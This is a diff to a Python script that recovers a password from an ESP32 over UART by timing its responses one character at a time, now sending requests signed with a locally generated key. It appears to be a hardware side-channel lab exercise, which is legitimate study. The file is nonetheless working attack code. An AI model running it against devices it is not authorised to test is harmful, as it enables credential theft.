@@ -1,19 +1,24 @@
+
 #!/usr/bin/env -S uv run --script
 # /// script
 # requires-python = ">=3.9"
 # dependencies = [
+#     "cryptography>=42",
 #     "pyserial>=3.5",
 # ]
 # ///
 
+"""UART password timing attack against the ESP32 authentication command."""
+
 import argparse
 import statistics
-import string
 import sys
 import time
 
 import serial
 from serial.tools import list_ports
+
+from keygen import PRIVATE_KEY_PATH, load_private_key
 
 
 # ---------------- Configuration ----------------
@@ -22,7 +27,11 @@ BAUD_RATE = 115200
 SERIAL_TIMEOUT = 2.0
 
 NUM_TESTS = 100
-MAX_PASSWORD_LENGTH = 11
+MAX_PASSWORD_LENGTH = 16
+
+CMD_PREFIX = "CMD "
+CMD_AUTH_CHECK = 1
+SIGNATURE_LEN = 64
 
 # All printable ASCII characters, including space.
 ASCII_CHARS = [chr(i) for i in range(32, 127)]
@@ -54,33 +63,48 @@ def find_port():
     sys.exit(1)
 
 
+# ---------------- Request construction ----------------
+
+def build_check_request(key, password: str) -> bytes:
+    """
+    Wire payload:
+        command (1) | password (16) | signature (64)
+    """
+    try:
+        data = password.encode("ascii")
+    except UnicodeEncodeError:
+        sys.exit("--passcode must be plain ASCII characters")
+
+    if len(data) > MAX_PASSWORD_LENGTH:
+        sys.exit(f"--passcode is limited to {MAX_PASSWORD_LENGTH} characters")
+
+    signed = (
+        bytes([CMD_AUTH_CHECK])
+        + data.ljust(MAX_PASSWORD_LENGTH, b"\0")
+    )
+
+    signature = key.sign(signed)
+
+    return signed + signature
+
+
 # ---------------- Password checking ----------------
 
-
-def build_check_request(password):
-    """
-    Construct the request BEFORE timing.
-
-    Change this to match your firmware's protocol.
-    """
-    return f"CHECK {password}\n".encode("ascii")
-
-
-def check_password(link, request):
+def check_password(link, request: str):
     """
     Send a preconstructed request and wait for the response.
 
     The caller measures this function's execution time.
     """
 
-    # Discard any stale responses.
+    # Discard stale responses.
     link.reset_input_buffer()
 
     # Send request.
-    link.write(request)
+    link.write(request.encode("ascii"))
     link.flush()
 
-    # Block until a response arrives.
+    # Wait for response.
     response = link.readline()
 
     return response.decode("ascii", errors="replace").strip()
@@ -88,8 +112,7 @@ def check_password(link, request):
 
 # ---------------- Timing attack ----------------
 
-
-def timing_attack(link):
+def timing_attack(link, key):
 
     result_pass = ""
 
@@ -104,19 +127,25 @@ def timing_attack(link):
         for ch in ASCII_CHARS:
             candidate = result_pass + ch
 
-            # IMPORTANT: Construct the message outside the timed section.
-            request = build_check_request(candidate)
+            # Construct and sign BEFORE timing.
+            request = (
+                CMD_PREFIX
+                + build_check_request(key, candidate).hex()
+                + "\n"
+            )
 
             times = []
 
             for _ in range(NUM_TESTS):
                 T1 = time.perf_counter()
+
                 msg = check_password(link, request)
+
                 T2 = time.perf_counter()
                 elapsed = T2 - T1
 
                 if msg == "ACCEPTED":
-                    print(f"\nPassword found: {candidate}")
+                    print(f"\nPassword found: {candidate!r}")
                     return candidate
 
                 if msg != "REJECTED":
@@ -140,7 +169,10 @@ def timing_attack(link):
 
         result_pass += current_max_ch
 
-        print(f"Guess: {result_pass!r} | Median: {current_max_time * 1000:.3f} ms")
+        print(
+            f"Guess: {result_pass!r} | "
+            f"Median: {current_max_time * 1000:.3f} ms"
+        )
 
     print("\nReached maximum password length.")
     return result_pass
@@ -148,22 +180,41 @@ def timing_attack(link):
 
 # ---------------- Main ----------------
 
-
 def main():
     global NUM_TESTS
-    parser = argparse.ArgumentParser(description="UART password timing attack")
 
-    parser.add_argument(
-        "--port", help="Serial port (automatically detected if omitted)"
+    parser = argparse.ArgumentParser(
+        description="UART password timing attack"
     )
 
-    parser.add_argument("--baud", type=int, default=BAUD_RATE)
+    parser.add_argument(
+        "--port",
+        help="Serial port (automatically detected if omitted)",
+    )
 
-    parser.add_argument("--tests", type=int, default=NUM_TESTS)
+    parser.add_argument(
+        "--baud",
+        type=int,
+        default=BAUD_RATE,
+    )
+
+    parser.add_argument(
+        "--tests",
+        type=int,
+        default=NUM_TESTS,
+    )
 
     args = parser.parse_args()
 
+    if args.tests < 1:
+        sys.exit("--tests must be at least 1")
+
     NUM_TESTS = args.tests
+
+    if not PRIVATE_KEY_PATH.exists():
+        sys.exit("No private key yet: run `make keys` first")
+
+    key = load_private_key()
 
     port = args.port or find_port()
 
@@ -184,7 +235,7 @@ def main():
         time.sleep(0.2)
         link.reset_input_buffer()
 
-        password = timing_attack(link)
+        password = timing_attack(link, key)
 
         if password:
             print(f"\nFinal password guess: {password!r}")
